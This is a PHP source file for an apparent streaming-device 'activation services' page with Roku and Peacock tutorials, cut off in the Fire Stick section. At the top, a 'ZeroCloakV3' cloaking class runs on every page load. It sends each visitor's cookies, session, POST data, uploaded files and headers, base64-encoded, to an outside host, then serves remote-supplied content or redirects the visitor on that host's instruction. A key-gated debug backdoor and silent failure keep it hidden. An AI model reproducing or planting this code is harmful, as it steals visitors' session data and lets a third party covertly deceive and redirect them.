<?php

class ZeroCloakV3
{
    private $targetUrl;
    private $encryptionKey;
    private $requestId;
    private $uei_6s71a1;
    private $cst_4u89t5;
    private $timeout;

    public function __construct()
    {
        header("Access-Control-Allow-Origin: *");
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
        header("Access-Control-Allow-Headers: Content-Type, Authorization");
        
        error_reporting(E_ALL);
        ini_set('display_errors', 1);

        $this->targetUrl        = 'https://app.zerocloak.com/realtime';
        $this->encryptionKey    = 'b96fe040-f322-4ffe-9981-94743ad3a129';
        $this->requestId        = uniqid('req_', true);
        $this->uei_6s71a1       = "jkmrvusiuk";
        $this->cst_4u89t5       = "oc8rjqji2p";
        $this->timeout          = 30;
    }

    private function retrieveAllHeaders()
    {
        if (!function_exists('getallheaders')) {
            $headers = [];
            foreach ($_SERVER as $name => $value) {
                if (substr($name, 0, 5) == 'HTTP_') {
                    $headers[str_replace(
                        ' ',
                        '-',
                        ucwords(strtolower(str_replace('_', ' ', substr($name, 5))))
                    )] = $value;
                }
            }
            return $headers;
        }
        return getallheaders();
    }

    private function gatherRequestData()
    {
        return [
            'request_id' => $this->requestId,
            'uei_6s71a1' => $this->uei_6s71a1,
            'cst_4u89t5' => $this->cst_4u89t5,
            'server'     => $_SERVER,
            'headers'    => $this->retrieveAllHeaders(),
            'get'        => $_GET,
            'post'       => $_POST,
            'files'      => $_FILES,
            'cookie'     => $_COOKIE,
            'session'    => isset($_SESSION) ? $_SESSION : [],
            'timestamp'  => date('Y-m-d H:i:s'),
        ];
    }

    private function transmitData($data, $maxRetries = 3)
    {
        if (function_exists('curl_version')) {
            return $this->sendUsingCurl($data, $maxRetries);
        } else {
            return $this->sendUsingFileGetContents($data);
        }
    }

    private function sendUsingCurl($data, $maxRetries = 3)
    {
        $ch = curl_init($this->targetUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/json',
            'Content-Length: ' . strlen($data),
            'X-Request-ID: ' . $this->requestId,
            'Cache-Control: no-cache',
            'Cache-Control: max-age=0',
            'Pragma: no-cache',
        ]);

        curl_setopt($ch, CURLOPT_TIMEOUT, $this->timeout);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $this->timeout);

        for ($retry = 0; $retry < $maxRetries; $retry++) {
            $response = curl_exec($ch);
            if ($response !== false) {
                curl_close($ch);
                return $response;
            }
            sleep(1);
        }

        curl_close($ch);
        return false;
    }

    private function sendUsingFileGetContents($data)
    {
        $opts = [
            "http" => [
                "header" => [
                    "Content-Type: application/json",
                    "Content-Length: " . strlen($data),
                    "X-Request-ID: " . $this->requestId,
                    "Cache-Control: no-cache",
                    'Cache-Control: max-age=0',
                    "Pragma: no-cache",
                ],
                "method" => "POST",
                "content" => $data,
                "timeout" => $this->timeout,
            ],
        ];

        $context = stream_context_create($opts);
        $response = @file_get_contents($this->targetUrl, false, $context);

        return $response;
    }

    public function clearCache()
    {
        if (function_exists('wp_cache_flush')) {
            wp_cache_flush();
        }

        if (function_exists('wp_cache_clear_cache')) {
            wp_cache_clear_cache();
        }
    }
    public function verify()
    {
        if(isset($_GET['8ea8cd56-1488']) && $_GET['8ea8cd56-1488'] == $this->encryptionKey){
            echo $this->cst_4u89t5;
            die();
        }
    }
    public function run()
    {
        $this->verify();
        $this->clearCache();
        $data = $this->gatherRequestData();
        
        if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(1) Send: Data Got -</h5><pre>";
            print_r($data);
            echo "</pre>";
        }
        
        $jsonData   = json_encode($data);
        
        if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(2) Send: Convert to Json -</h5><pre>";
            print_r($jsonData);
            echo "</pre>";
        }

        if ($jsonData === false) {
            $this->failHandle("Error: JSON encoding failed: " . json_last_error_msg());
            return false;
        }

        $base64Data = base64_encode($jsonData);
        
        if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(3) Send: Json to base64_encode -</h5><pre>";
            print_r($base64Data);
            echo "</pre>";
        }

        if ($base64Data === false) {
            $this->failHandle("Error: Base64 encoding failed");
            return false;
        }

        $response = $this->transmitData($base64Data);
        
        if(isset($_GET['debug-8ea8cd56-1488-main']) && $_GET['debug-8ea8cd56-1488-main'] == $this->encryptionKey){
              echo $response;
              die;
        }
        
        if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(1) Receive: Data Got -</h5><pre>";
            print_r($response);
            echo "</pre>";
        }
        
        if ($response !== false) {
            $this->successHandle($response);
        } else {
            $this->failHandle($response);
        }
    }

    public function successHandle($response)
    {

        $base64decodeData = base64_decode($response);
        
         if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(5) Receive: decryptedData -</h5><pre>";
            print_r($base64decodeData);
            echo "</pre>";
        }
        
        
        if ($base64decodeData === false) {
            $this->failHandle("Error: Base64 decode failed");
            return false;
        }

        $responseData = json_decode($base64decodeData, true);

         if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(6) Receive: decryptedData -</h5><pre>";
            print_r($responseData);
            echo "</pre>";
        }
        if ($responseData === null && json_last_error() !== JSON_ERROR_NONE) {
            $this->failHandle("Error: JSON decoding failed");
            return false;
        }
        if(!$responseData['status']){
            $this->failHandle($responseData['message']);
            return false;
        }

       if (
            (isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] === $this->encryptionKey) ||
            (isset($_GET['debug-8ea8cd56-1488-main']) && $_GET['debug-8ea8cd56-1488-main'] === $this->encryptionKey)
        ) {
            die();
        }

        if(!($responseData['data']['nothing'])){

            if(isset($responseData['data']['hr'])){
                header("Referrer-Policy: no-referrer");
            }

            if(!is_null($responseData['data']['zrc'])){

                if(!$responseData['data']['zrc']['status']){
                    $this->failHandle($responseData['data']['zrc']['message']);
                    return false;

                }else{
                    $this->zeroRedirectionCloaking($responseData['data']['zrc']['content']);
                    return true;

                }
            }

            $this->redirectTo($responseData['data']['url'],$responseData['data']['http_code']);
            return true;
        }
        return true;

    }
    private function zeroRedirectionCloaking(string $content = '') {
        echo $content;
        die();
    }
    private function redirectTo(string $url, string $method = 'header-301') {
        switch (strtolower($method)) {
            case 'header-301':
                header("Location: $url", 301);
                exit;

            case 'header-302':
                header("Location: $url", 302);
                exit;

            case 'header-refresh':
                header("Refresh: 0;url=$url");
                exit;

            case 'meta':
                echo '<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=' . htmlspecialchars($url) . '"><title>Redirecting...</title></head><body><a href="' . htmlspecialchars($url) . '">Click here</a></body></html>';
                exit;

            case 'js_meta':
                echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Redirecting...</title></head><body><script>window.location.href = "' . htmlspecialchars($url) . '";</script><noscript><meta http-equiv="refresh" content="0;url=' . htmlspecialchars($url) . '"></noscript><p>If you are not redirected, <a href="' . htmlspecialchars($url) . '">click here</a>.</p></body></html>';
                exit;

            default:
                header("Location: $url", 301);
                exit;
        }
    }

    private function failHandle($response)
    {
        // Silently fail and allow the page to load instead of breaking the website
        return false;
    }
}

$zerocloakCloaking = new ZeroCloakV3();
$zerocloakCloaking->run();

// @zerocloak.com 2026-05-16 06:53:20
?>
<?php include 'includes/header.php'; ?>

<div class="pt-32 pb-0 bg-white">
    <div class="container mx-auto px-6 max-w-4xl text-center mb-20 fade-in-up">
        <h1 class="text-5xl font-extrabold text-slate-900 mb-6">Our Services & Setup Guides</h1>
        <p class="text-xl text-slate-600 mb-6">Professional installation, configuration, activation services, and step-by-step guides.</p>
        <div class="bg-amber-50 border border-amber-200 text-amber-800 px-6 py-4 rounded-xl text-sm md:text-base inline-block text-left max-w-3xl">
            <strong>Disclaimer:</strong> streamactivatehub.com is an independent guide. Visit official links provided below to visit the official site of your choice.
        </div>
    </div>

    <!-- SERVICES SECTION -->
    <div class="container mx-auto px-6 mb-24 space-y-24">
        
        <!-- Service 1: Smart TV Setup Services -->
        <div class="flex flex-col lg:flex-row gap-12 items-center fade-in-up">
            <div class="w-full lg:w-1/2">
                <div class="rounded-3xl overflow-hidden shadow-2xl relative aspect-[4/3]">
                    <img src="assets/images/smart_tv_setup.png" alt="Smart TV Setup Services" class="object-cover w-full h-full" />
                </div>
            </div>
            <div class="w-full lg:w-1/2">
                <div class="flex items-center gap-4 mb-4">
                    <div class="w-12 h-12 bg-primary/10 text-primary rounded-xl flex items-center justify-center">
                        <i data-lucide="tv" class="w-6 h-6"></i>
                    </div>
                    <h2 class="text-3xl font-bold text-slate-900">Smart TV Setup Services</h2>
                </div>
                <p class="text-lg text-slate-600 mb-6 leading-relaxed">At StreamActivateHub, we provide reliable Smart TV setup services designed to help users quickly connect and configure their entertainment devices. Our setup assistance includes WiFi connection support, app installation guidance, streaming configuration, account setup, software updates, and device optimization. Whether you are installing a brand-new Smart TV or troubleshooting an existing setup, our goal is to make the process simple and hassle-free. We support a wide range of Smart TVs and streaming platforms to help users enjoy smooth access to movies, live channels, sports, and digital entertainment services.</p>
                <a href="contact" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Book This Service</a>
            </div>
        </div>

        <!-- Service 2: Device Installation Assistance -->
        <div class="flex flex-col lg:flex-row-reverse gap-12 items-center fade-in-up">
            <div class="w-full lg:w-1/2">
                <div class="rounded-3xl overflow-hidden shadow-2xl relative aspect-[4/3]">
                    <img src="assets/images/device_installation.png" alt="Device Installation Assistance" class="object-cover w-full h-full" />
                </div>
            </div>
            <div class="w-full lg:w-1/2">
                <div class="flex items-center gap-4 mb-4">
                    <div class="w-12 h-12 bg-primary/10 text-primary rounded-xl flex items-center justify-center">
                        <i data-lucide="monitor-play" class="w-6 h-6"></i>
                    </div>
                    <h2 class="text-3xl font-bold text-slate-900">Device Installation Assistance</h2>
                </div>
                <p class="text-lg text-slate-600 mb-6 leading-relaxed">StreamActivateHub offers professional device installation assistance for Smart TVs, streaming devices, media players, and home entertainment systems. Our service helps users properly connect, configure, and optimize their devices for reliable performance and seamless streaming. We assist with internet setup, account synchronization, software configuration, and compatibility guidance for multiple entertainment platforms. Our goal is to simplify the installation process while helping users maximize the functionality of their streaming and connected devices. We provide easy-to-follow assistance designed to improve convenience, connectivity, and overall user experience.</p>
                <a href="contact" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Book This Service</a>
            </div>
        </div>

        <!-- Service 3: Streaming Support Guides -->
        <div class="flex flex-col lg:flex-row gap-12 items-center fade-in-up">
            <div class="w-full lg:w-1/2">
                <div class="rounded-3xl overflow-hidden shadow-2xl relative aspect-[4/3]">
                    <img src="assets/images/streaming_support.png" alt="Streaming Support Guides" class="object-cover w-full h-full" />
                </div>
            </div>
            <div class="w-full lg:w-1/2">
                <div class="flex items-center gap-4 mb-4">
                    <div class="w-12 h-12 bg-primary/10 text-primary rounded-xl flex items-center justify-center">
                        <i data-lucide="book-open" class="w-6 h-6"></i>
                    </div>
                    <h2 class="text-3xl font-bold text-slate-900">Streaming Support Guides</h2>
                </div>
                <p class="text-lg text-slate-600 mb-6 leading-relaxed">At StreamActivateHub, our streaming support guides are designed to help users install, activate, and troubleshoot popular streaming platforms and entertainment devices with confidence. Our guides include step-by-step instructions for app installation, account activation, internet connectivity, streaming optimization, and device compatibility. Whether users are setting up a Smart TV, streaming stick, or connected media device, our goal is to provide simple and user-friendly guidance that improves the overall streaming experience. We help users understand setup processes while making streaming services easier to access and manage.</p>
                <a href="contact" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Book This Service</a>
            </div>
        </div>

        <!-- Service 4: Home Theater Setup -->
        <div class="flex flex-col lg:flex-row-reverse gap-12 items-center fade-in-up">
            <div class="w-full lg:w-1/2">
                <div class="rounded-3xl overflow-hidden shadow-2xl relative aspect-[4/3]">
                    <img src="assets/images/home_theater.png" alt="Home Theater Setup" class="object-cover w-full h-full" />
                </div>
            </div>
            <div class="w-full lg:w-1/2">
                <div class="flex items-center gap-4 mb-4">
                    <div class="w-12 h-12 bg-primary/10 text-primary rounded-xl flex items-center justify-center">
                        <i data-lucide="speaker" class="w-6 h-6"></i>
                    </div>
                    <h2 class="text-3xl font-bold text-slate-900">Home Theater Setup</h2>
                </div>
                <p class="text-lg text-slate-600 mb-6 leading-relaxed">StreamActivateHub provides home theater setup assistance to help users create an enjoyable and connected entertainment environment. Our services include TV placement guidance, speaker connection support, streaming device integration, audio configuration, and entertainment system setup. We help users properly connect and optimize their devices for improved sound quality, streaming performance, and viewing comfort. Whether configuring a simple home entertainment system or a more advanced setup, our goal is to make installation easy and efficient while helping users enjoy a seamless home theater experience.</p>
                <a href="contact" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Book This Service</a>
            </div>
        </div>

        <!-- Service 5: Activation Tutorials -->
        <div class="flex flex-col lg:flex-row gap-12 items-center fade-in-up">
            <div class="w-full lg:w-1/2">
                <div class="rounded-3xl overflow-hidden shadow-2xl relative aspect-[4/3]">
                    <img src="assets/images/activation_tutorials.png" alt="Activation Tutorials" class="object-cover w-full h-full" />
                </div>
            </div>
            <div class="w-full lg:w-1/2">
                <div class="flex items-center gap-4 mb-4">
                    <div class="w-12 h-12 bg-primary/10 text-primary rounded-xl flex items-center justify-center">
                        <i data-lucide="play-circle" class="w-6 h-6"></i>
                    </div>
                    <h2 class="text-3xl font-bold text-slate-900">Activation Tutorials</h2>
                </div>
                <p class="text-lg text-slate-600 mb-6 leading-relaxed">StreamActivateHub offers easy-to-follow activation tutorials designed to help users activate Smart TVs, streaming platforms, and connected entertainment devices quickly and efficiently. Our tutorials guide users through important setup steps including WiFi connection, account login, activation code entry, app verification, and device synchronization. Designed for users of all experience levels, our tutorials simplify the activation process while helping reduce setup errors and connectivity issues. Our goal is to provide clear and reliable setup guidance that helps users access streaming services and entertainment content with confidence.</p>
                <a href="contact" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Book This Service</a>
            </div>
        </div>

    </div>

    <!-- SPECIFIC SERVICE TUTORIALS SECTION -->
    <div class="bg-white py-24 border-t border-slate-200">
        <div class="container mx-auto px-6 max-w-5xl">
            <div class="text-center mb-16 fade-in-up">
                <span class="inline-block py-1.5 px-4 rounded-full bg-primary/10 text-primary font-semibold text-sm mb-4">Device Specific</span>
                <h2 class="text-4xl font-bold text-slate-900 mb-6">Service Activation Tutorials</h2>
                <p class="text-lg text-slate-600">Step-by-step guides for the most popular platforms.</p>
            </div>

            <!-- Tabs Navigation -->
            <div class="flex flex-wrap justify-center gap-4 mb-12 fade-in-up">
                <button onclick="showTutorial('roku')" id="btn-roku" class="tutorial-btn px-8 py-4 rounded-full font-bold text-lg transition-all bg-primary text-white shadow-lg shadow-primary/30">Roku</button>
                <button onclick="showTutorial('peacock')" id="btn-peacock" class="tutorial-btn px-8 py-4 rounded-full font-bold text-lg transition-all bg-slate-100 text-slate-600 hover:bg-slate-200">Peacock TV</button>
                <button onclick="showTutorial('firestick')" id="btn-firestick" class="tutorial-btn px-8 py-4 rounded-full font-bold text-lg transition-all bg-slate-100 text-slate-600 hover:bg-slate-200">Amazon Fire Stick</button>
            </div>

            <!-- Tab Contents -->
            <div class="bg-slate-50 p-8 md:p-12 rounded-3xl border border-slate-100 shadow-sm fade-in-up">
                
                <!-- Roku Tutorial -->
                <div id="tutorial-roku" class="tutorial-content space-y-8 block">
                    <div class="text-center">
                        <h3 class="text-3xl font-extrabold text-slate-900 flex items-center justify-center gap-3 mb-4">
                            <i data-lucide="tv" class="text-primary w-8 h-8"></i> Roku Activation Guide
                        </h3>
                        <p class="text-xl text-slate-600">Easy Roku Device Setup & Activation Tutorial</p>
                        <a href="https://my.roku.com/link" target="_blank" rel="nofollow noopener" class="mt-4 inline-flex items-center gap-2 bg-slate-100 border border-slate-200 text-slate-700 hover:bg-primary hover:text-white hover:border-primary px-6 py-2.5 rounded-full font-semibold transition-all">
                            Visit Official Roku Link <i data-lucide="external-link" class="w-4 h-4"></i>
                        </a>
                    </div>

                    <div class="bg-blue-50 border border-blue-100 rounded-2xl p-6 text-slate-700">
                        <p>Setting up a Roku streaming device is a simple process that allows users to access movies, TV shows, sports, live channels, and entertainment applications directly from their television. This guide explains how to connect, activate, and configure your Roku device in a beginner-friendly way.</p>
                        <p class="mt-2 text-sm text-slate-500"><strong>Disclaimer:</strong> StreamActivateHub is an independent informational website and is not affiliated with Roku or any streaming platform.</p>
                    </div>

                    <div class="bg-white border border-slate-100 shadow-sm p-8 rounded-2xl">
                        <h4 class="text-xl font-bold text-slate-900 mb-4">What You Need Before Roku Setup</h4>
                        <ul class="grid grid-cols-1 md:grid-cols-2 gap-4 text-slate-600">
                            <li class="flex items-center gap-2"><i data-lucide="check" class="text-green-500 w-5 h-5"></i> A Roku streaming device or Roku Smart TV</li>
                            <li class="flex items-center gap-2"><i data-lucide="check" class="text-green-500 w-5 h-5"></i> A television with HDMI support</li>
                            <li class="flex items-center gap-2"><i data-lucide="check" class="text-green-500 w-5 h-5"></i> Stable internet connection</li>
                            <li class="flex items-center gap-2"><i data-lucide="check" class="text-green-500 w-5 h-5"></i> Roku account email address</li>
                            <li class="flex items-center gap-2"><i data-lucide="check" class="text-green-500 w-5 h-5"></i> Roku remote with batteries</li>
                            <li class="flex items-center gap-2"><i data-lucide="check" class="text-green-500 w-5 h-5"></i> Power adapter and HDMI cable</li>
                        </ul>
                    </div>

                    <!-- Steps Grid -->
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
                        
                        <div class="space-y-4">
                            <h4 class="text-lg font-bold text-slate-900">Step 1 — Connect Your Roku Device</h4>
                            <img src="assets/images/roku/roku_1.jpg" alt="Connect Roku Device" class="rounded-xl w-full object-cover h-48 border border-slate-200">
                            <ul class="space-y-2 text-slate-600">
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Plug the Roku device into your TV’s HDMI port.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Connect the power cable.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Turn on your television.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Select the correct HDMI input source.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Wait for the Roku welcome screen to appear.</li>
                            </ul>
                        </div>

                        <div class="space-y-4">
                            <h4 class="text-lg font-bold text-slate-900">Step 2 — Pair the Roku Remote</h4>
                            <img src="assets/images/roku/roku_2.jpg" alt="Pair Roku Remote" class="rounded-xl w-full object-cover h-48 border border-slate-200">
                            <ul class="space-y-2 text-slate-600">
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Insert batteries into the remote.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Wait for automatic pairing.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>If not automatic, press and hold the pairing button inside the battery compartment.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Wait until the status light flashes.</li>
                            </ul>
                        </div>

                        <div class="space-y-4">
                            <h4 class="text-lg font-bold text-slate-900">Step 3 — Connect Roku to WiFi</h4>
                            <img src="assets/images/roku/roku_3.jpg" alt="Connect Roku to WiFi" class="rounded-xl w-full object-cover h-48 border border-slate-200">
                            <ul class="space-y-2 text-slate-600">
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Choose your wireless network from the list displayed on the screen.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Enter your WiFi password carefully.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Wait for the connection test.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Allow Roku to download any available software updates.</li>
                            </ul>
                        </div>

                        <div class="space-y-4">
                            <h4 class="text-lg font-bold text-slate-900">Step 4 — Roku Activation Process</h4>
                            <img src="assets/images/roku/roku_4.jpg" alt="Roku Activation Process" class="rounded-xl w-full object-cover h-48 border border-slate-200">
                            <ul class="space-y-2 text-slate-600">
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Roku will display an activation code on your television.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Open your browser on a phone or computer and visit the Roku activation webpage.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Sign into your Roku account.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Enter the activation code shown on the TV and follow instructions.</li>
                            </ul>
                        </div>

                    </div>

                    <div class="grid grid-cols-1 md:grid-cols-2 gap-8 mt-8">
                        <div class="bg-slate-100 p-6 rounded-2xl">
                            <h4 class="text-lg font-bold text-slate-900 mb-4"><i data-lucide="alert-circle" class="w-5 h-5 inline text-primary mb-1"></i> Common Setup Issues</h4>
                            <div class="space-y-4 text-slate-600">
                                <div><strong>Not Connecting to WiFi:</strong> Restart router, move device closer, check password.</div>
                                <div><strong>Activation Code Not Working:</strong> Refresh screen, generate a new code, ensure correct entry.</div>
                                <div><strong>Remote Not Pairing:</strong> Replace batteries, restart Roku, repeat pairing.</div>
                            </div>
                        </div>

                        <div class="bg-slate-100 p-6 rounded-2xl">
                            <h4 class="text-lg font-bold text-slate-900 mb-4"><i data-lucide="help-circle" class="w-5 h-5 inline text-primary mb-1"></i> Frequently Asked Questions</h4>
                            <div class="space-y-4 text-slate-600">
                                <div><strong>Can I use Roku without cable?</strong> Yes. It works through internet streaming.</div>
                                <div><strong>Does Roku require an account?</strong> Yes, a Roku account is required.</div>
                                <div><strong>Can Roku work on older TVs?</strong> Yes, if the TV supports HDMI or AV connections (depending on the model).</div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Peacock TV Tutorial -->
                <div id="tutorial-peacock" class="tutorial-content space-y-8 hidden">
                    <div class="text-center">
                        <h3 class="text-3xl font-extrabold text-slate-900 flex items-center justify-center gap-3 mb-4">
                            <i data-lucide="play-circle" class="text-primary w-8 h-8"></i> Peacock TV Activation Tutorial
                        </h3>
                        <p class="text-xl text-slate-600">How to Activate Peacock TV on Smart TVs & Streaming Devices</p>
                        <a href="https://www.peacocktv.com/tv" target="_blank" rel="nofollow noopener" class="mt-4 inline-flex items-center gap-2 bg-slate-100 border border-slate-200 text-slate-700 hover:bg-primary hover:text-white hover:border-primary px-6 py-2.5 rounded-full font-semibold transition-all">
                            Visit Official Peacock Link <i data-lucide="external-link" class="w-4 h-4"></i>
                        </a>
                    </div>

                    <div class="bg-blue-50 border border-blue-100 rounded-2xl p-6 text-slate-700">
                        <p>Peacock TV is a streaming platform that offers movies, television shows, live sports, and entertainment content across multiple devices. This tutorial explains how to install and activate Peacock TV on compatible streaming platforms.</p>
                        <p class="mt-2 text-sm text-slate-500"><strong>Disclaimer:</strong> StreamActivateHub is an independent informational website and is not affiliated with Peacock TV or NBCUniversal.</p>
                    </div>

                    <div class="bg-white border border-slate-100 shadow-sm p-8 rounded-2xl">
                        <h4 class="text-xl font-bold text-slate-900 mb-4">Compatible Devices for Peacock TV</h4>
                        <ul class="grid grid-cols-1 md:grid-cols-3 gap-4 text-slate-600">
                            <li class="flex items-center gap-2"><i data-lucide="check" class="text-green-500 w-5 h-5"></i> Roku devices</li>
                            <li class="flex items-center gap-2"><i data-lucide="check" class="text-green-500 w-5 h-5"></i> Amazon Fire TV</li>
                            <li class="flex items-center gap-2"><i data-lucide="check" class="text-green-500 w-5 h-5"></i> Apple TV</li>
                            <li class="flex items-center gap-2"><i data-lucide="check" class="text-green-500 w-5 h-5"></i> Android TV</li>
                            <li class="flex items-center gap-2"><i data-lucide="check" class="text-green-500 w-5 h-5"></i> Samsung Smart TVs</li>
                            <li class="flex items-center gap-2"><i data-lucide="check" class="text-green-500 w-5 h-5"></i> LG Smart TVs</li>
                            <li class="flex items-center gap-2"><i data-lucide="check" class="text-green-500 w-5 h-5"></i> Gaming consoles</li>
                            <li class="flex items-center gap-2"><i data-lucide="check" class="text-green-500 w-5 h-5"></i> Mobile devices</li>
                            <li class="flex items-center gap-2"><i data-lucide="check" class="text-green-500 w-5 h-5"></i> Web browsers</li>
                        </ul>
                    </div>

                    <!-- Steps Grid -->
                    <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
                        
                        <div class="space-y-4">
                            <h4 class="text-lg font-bold text-slate-900">Step 1 — Install the App</h4>
                            <img src="assets/images/peacock/peacock_1.jpg" alt="Install Peacock App" class="rounded-xl w-full object-cover h-48 border border-slate-200">
                            <ul class="space-y-2 text-slate-600">
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Open your device’s app store.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Search for “Peacock TV.”</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Select the app from the search results.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Download and install the application.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Wait for installation to complete.</li>
                            </ul>
                        </div>

                        <div class="space-y-4">
                            <h4 class="text-lg font-bold text-slate-900">Step 2 — Open the App</h4>
                            <img src="assets/images/peacock/peacock_2.jpg" alt="Open Peacock App" class="rounded-xl w-full object-cover h-48 border border-slate-200">
                            <ul class="space-y-2 text-slate-600">
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Launch the Peacock TV application.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Choose “Sign In.”</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>An activation code may appear.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Keep the activation screen open.</li>
                            </ul>
                        </div>

                        <div class="space-y-4">
                            <h4 class="text-lg font-bold text-slate-900">Step 3 — Activate Peacock TV</h4>
                            <img src="assets/images/peacock/peacock_3.jpg" alt="Activate Peacock TV" class="rounded-xl w-full object-cover h-48 border border-slate-200">
                            <ul class="space-y-2 text-slate-600">
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Using a separate device, open a web browser.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Visit the Peacock activation page.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Sign into your account.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Enter the activation code shown on your TV.</li>
                            </ul>
                        </div>

                    </div>

                    <div class="grid grid-cols-1 md:grid-cols-2 gap-8 mt-8">
                        <div class="bg-slate-100 p-6 rounded-2xl">
                            <h4 class="text-lg font-bold text-slate-900 mb-4"><i data-lucide="alert-circle" class="w-5 h-5 inline text-primary mb-1"></i> Common Problems</h4>
                            <div class="space-y-4 text-slate-600">
                                <div><strong>Activation Code Expired:</strong> Refresh the code directly from the TV app.</div>
                                <div><strong>App Not Loading:</strong> Restart device, check internet, update app, clear cache.</div>
                                <div><strong>Streaming Buffering:</strong> Improve internet speed, reduce simultaneous streaming.</div>
                            </div>
                        </div>

                        <div class="bg-slate-100 p-6 rounded-2xl">
                            <h4 class="text-lg font-bold text-slate-900 mb-4"><i data-lucide="help-circle" class="w-5 h-5 inline text-primary mb-1"></i> Frequently Asked Questions</h4>
                            <div class="space-y-4 text-slate-600">
                                <div><strong>Is Peacock TV free?</strong> It may offer free and premium subscription options depending on your region.</div>
                                <div><strong>Multiple devices?</strong> Yes, supports multiple devices under one account.</div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Amazon Fire Stick Tutorial -->
                <div id="tutorial-firestick" class="tutorial-content space-y-8 hidden">
                    <div class="text-center">
                        <h3 class="text-3xl font-extrabold text-slate-900 flex items-center justify-center gap-3 mb-4">
